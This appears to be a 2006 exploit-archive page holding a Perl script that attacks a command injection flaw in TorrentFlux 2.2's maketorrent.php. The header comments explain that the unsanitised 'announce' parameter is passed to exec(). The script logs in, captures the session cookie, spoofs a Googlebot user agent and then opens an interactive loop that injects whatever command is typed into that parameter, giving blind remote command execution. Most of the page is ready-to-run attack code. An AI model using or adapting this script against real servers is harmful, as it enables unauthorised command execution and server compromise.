<html><head><title>TorrentFlux 2.2 (maketorrent.php) Remote Command Execution Exploit</title></head><pre># The variable announce in maketorrent.php is not sanitised before being used. The announce 
# variable goes through various stages throughout the script, then it is passed as a into
# an exec() function. This occurs in the middle of the string which is passed to the exec()
# function. Therefore it is possible to stop the current stop by starting with ; then by
# ending your command with ; (to avoid the other data TorrentFlux adds after the announce variable). 
# No data is returned to the user when they use this exploit, so it is hard to tell if the script
# is vulnerable, and the use of htmlspecialchars() tends to make things much hard since 
# chracters like &lt; and &gt; dont work. 

# r0ut3r (writ3r [at] gmail.com)

#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                         TorrentFlux 2.2 Command Execution Exploit                             #
#################################################################################################
# Software: TorrentFlux 2.2                                                                     #
#                                                                                               #
# Vendor: http://www.torrentflux.com/                                                           #
#                                                                                               #
# Released: 2006/12/09                                                                          #
#                                                                                               #
# Discovered &amp; Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #
#                                                                                               #
# Note from a developer: &quot;Valid TorrentFlux user IDs are REQUIRED and this is NOT an open       #
# vulnerability to a NON user&quot;.                                                                 #
#                                                                                               #
# Note: The information provided in this document is for TorrentFlux administrator              #
# testing purposes only! This vulnerability requires a user account. And watch out              #
# for htmlspecialchars() when sending commands since tf uses it to sanitise variables.          #
#                                                                                               #
# Apart from a few problems (which are fixed) TorrentFlux is a great torrent client.            #
# Download it at: http://www.torrentflux.com/                                                   #
#################################################################################################

use IO::Socket;

$port = &quot;80&quot;; # connection port
$target = @ARGV[0]; # torrentflux.com
$folder = @ARGV[1]; # /torrentflux/
$user = @ARGV[2]; # login username
$pass = @ARGV[3]; # login password

sub Header()
{
	print q
	{#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                         TorrentFlux 2.2 Command Execution Exploit                             #
#################################################################################################
};
}

sub Usage()
{
	print q
	{
Usage: tf2exec.pl [target] [directory] [username] [password]
Example: tf2exec.pl torrentflux.com /torrentflux/ r0ut3r testing123 
};
	exit();
}

Header();

if (!$target || !$folder || !$user || !$pass) {
	Usage(); }

#Thanks to cb88 for the login request... 
print &quot;\n[+] Connecting...\r\n&quot;;
$sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; $port) || die &quot;[-] Failed to connect. Exiting...\r\n&quot;;
print &quot;[+] Attempting to login\n&quot;;
print $sock &quot;GET &quot;.$folder.&quot;login.php?username=$user&amp;iamhim=$pass HTTP/1.1\n&quot;;
print $sock &quot;Host: $target\n&quot;;
print $sock &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n&quot;;
print $sock &quot;Accept: text/html\n&quot;;
print $sock &quot;Connection: keep-alive\n\n\r\n&quot;;

while (&lt;$sock&gt;)
{
        if (/Cookie: TorrentFlux=(.*?);/)
        {
                $cookie = &quot;TorrentFlux=$1&quot;;
        }
}

print &quot;[+] Successfully logged in\n&quot;;
print &quot;[+] Cookie: &quot;.$cookie.&quot;\n&quot;;
if ($cookie eq &quot;&quot;)
{
        print &quot;[-] Failed to login. Exiting...&quot;;
	exit();
}

print &quot;[+] Starting shell\n&quot;;
print &quot;[cmd]\$ &quot;;
$cmd = &lt;STDIN&gt;;
$cmd =~ s/ /%20/g;
while ($cmd !~ &quot;exit&quot;)
{
	$xpack = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; $port) || die &quot;[-] Failed to connect on exploit attempt. Exiting...\r\n&quot;;
	print $xpack &quot;GET &quot;.$folder.&quot;maketorrent.php?announce=;&quot;.substr($cmd, 0, -1).&quot;; HTTP/1.1\n&quot;;
	print $xpack &quot;Host: $target\n&quot;;
	print $xpack &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n&quot;;
	print $xpack &quot;Accept: text/html\n&quot;;
	print $xpack &quot;Cookie: &quot;.$cookie.&quot;\n&quot;;
	print $xpack &quot;Connection: keep-alive\n\n&quot;;

	print &quot;[cmd]\$ &quot;;
	$cmd = &lt;STDIN&gt;;
}

print &quot;[!] Connection to host lost...\n&quot;;

#################################################################################################
#               This has been another r0ut3r discovery - writ3r [at] gmail.com                  #
#################################################################################################

# milw0rm.com [2006-12-09]</pre></html>